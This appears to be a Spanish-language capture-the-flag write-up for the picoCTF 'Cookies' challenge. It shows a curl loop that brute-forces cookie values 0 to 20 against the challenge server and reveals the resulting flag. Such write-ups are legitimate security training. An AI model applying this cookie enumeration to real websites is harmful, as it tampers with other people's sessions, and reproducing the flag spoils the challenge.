## Cookies

### Objetivos 
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)

### Pistas
(None)

### Solución 
- probamos a introducir algo en el campo de texto
- nos dice que no es una cookie valida
- con el pluggin editor de cookies cambiamos el valor de la cookie generada a 1
- ahora si nos dice que es una cookie valida, pero no es especial
- copiamos el link de la pagina para hacer la solicitud desde consola
- hacemos un ciclo for que va probar los numeros de 0 a 20 para encontrar la cookie que nos muestre la bandera. 

``` bash
kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>
```

picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}

### Notas adicionales:
### Referencias:
